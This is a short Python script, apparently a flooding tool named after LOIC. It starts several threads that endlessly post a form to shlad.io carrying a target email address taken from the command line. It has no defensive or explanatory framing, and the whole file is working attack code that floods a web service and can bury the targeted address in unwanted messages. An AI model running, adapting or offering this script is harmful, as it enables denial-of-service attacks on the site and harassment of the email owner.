import requests
import sys
import threading

def auto_shlad(target, should_stop):
    data = {
        'email': target,
        'origin':'djankgo'
    }

    while not should_stop.is_set():
        requests.post('http://www.shlad.io/', data)

def loic_shlad(n, target):
    print("init loic_shlad: %d %s" % (n, target))

    should_stop = threading.Event()

    for _ in range(n):
        threading.Thread(
            target=auto_shlad,
            args=[target, should_stop],
        ).start()

    return should_stop

if __name__ == "__main__":
    target = 'shl@d'

    if len(sys.argv) > 1:
        target = sys.argv[1]

    should_stop = loic_shlad(4, target)

    try:
        while True:
            pass
    except KeyboardInterrupt:
        should_stop.set()

